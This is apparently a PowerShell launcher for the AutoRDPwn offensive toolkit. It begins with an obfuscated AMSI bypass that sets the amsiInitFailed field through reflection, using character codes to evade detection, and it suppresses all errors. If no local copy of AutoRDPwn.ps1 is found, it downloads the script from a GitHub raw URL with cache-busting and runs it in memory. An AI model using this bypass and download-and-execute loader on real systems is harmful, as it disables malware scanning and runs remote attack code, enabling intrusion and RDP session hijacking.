$ErrorActionPreference = "SilentlyContinue"
try {
  $amsiUtils = [Ref].Assembly.GetType(('System.Management.Automation.' + [char]65 + 'msiUtils'))
  $amsiInit = [char]97 + 'msiInitFailed'
  $amsiUtils.GetField($amsiInit, [Reflection.BindingFlags]'NonPublic,Static').SetValue($null, $true)
} catch { }

$scriptPath = $null
if ($PSScriptRoot -and (Test-Path "$PSScriptRoot\..\..\AutoRDPwn.ps1")) {
  $scriptPath = Resolve-Path "$PSScriptRoot\..\..\AutoRDPwn.ps1"
}

if ($scriptPath) {
  & $scriptPath @args
} else {
  $webclient = New-Object System.Net.WebClient
  $webclient.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
  $webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
  $cachebust = (Get-Date).Ticks
  $content = $webclient.DownloadString("https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/AutoRDPwn.ps1?v=$cachebust")
  $block = [System.Management.Automation.ScriptBlock]::Create($content)
  if ($content -match '/v:\$') { Write-Host "[+] Fresh script loaded (cache-busted)." -ForegroundColor Green }
  & $block @args
}
